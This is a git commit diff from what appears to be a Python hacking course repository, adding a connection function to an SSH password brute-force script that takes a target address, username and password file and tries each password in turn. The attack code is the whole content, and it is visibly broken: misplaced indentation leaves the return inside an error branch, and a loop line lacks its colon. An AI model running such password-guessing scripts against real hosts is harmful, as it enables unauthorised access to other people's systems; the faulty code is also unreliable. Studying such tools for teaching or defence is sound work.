1e1db90d839ddf101477f414ae99a5b72e70a206
albert18 <erertech@gmail.com>
2022-12-16 20:21:56 +0300

    update

--- 4. Udemy/1. Python 3 Hacking/3. Threaded SSH Bruteforce/sshbrute.py
+++ 4. Udemy/1. Python 3 Hacking/3. Threaded SSH Bruteforce/sshbrute.py
@@ -1,5 +1,19 @@
 import paramiko, sys, os, socket, termcolor
 
+def ssh_connect(password, code=0):
+    ssh = paramiko.SSHClient()
+    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+    
+    try:
+        ssh.connect(host, port=22, username=username, password=password)
+    except paramiko.AuthenticationException:
+        code = 1
+    except socket.error as e:
+        code = 2
+        
+        ssh.close()
+        return code
+
 host = input('[+] Target Address: ')
 username = input('[+] SSH Username: ')
 input_file = input('[+] Passwords File: ')
@@ -12,6 +26,6 @@ with open(input_file, 'r') as file:
     for line in file.readlines()
         password = line.strip()
         try:
-            ssh_connect(password)
+            response = ssh_connect(password)
 
 
